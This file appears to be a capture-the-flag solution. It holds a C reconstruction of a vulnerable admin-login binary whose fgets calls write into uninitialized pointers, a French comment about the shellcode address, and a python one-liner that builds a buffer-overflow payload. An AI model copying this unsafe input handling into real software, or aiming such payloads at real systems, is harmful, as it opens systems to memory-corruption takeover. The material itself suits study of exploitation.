#include <stdio.h>
#include <string.h>

char *a_user_name;

int verify_user_name()
{
	puts("verifying username....\n");
	return (strcmp(a_user_name, "dat_wil"));
}

int verify_user_pass(char *pass)
{
	return (strcmp(pass, "admin"));
}

int main()
{
	puts("********* ADMIN LOGIN PROMPT *********");
	printf("Enter Username: ");
	fgets(a_user_name, 256, stdin);
	if (verify_user_name() != 0)
	{
		puts("nope, incorrect username...\n");
		return 0;
	}
	puts("Enter Password: ");
	char *pass;
	fgets(pass, 100, stdin);
	if (verify_user_pass(pass) == 0);
	{
		puts("nope, incorrect password...\n");
		return 0;
	}

	return 0;
}

// Normalement c'est juste un probleme d'adresse du shellcode
python -c 'print "dat_wil" + "\xba\xd8\xff\xff"*83' > /tmp/flag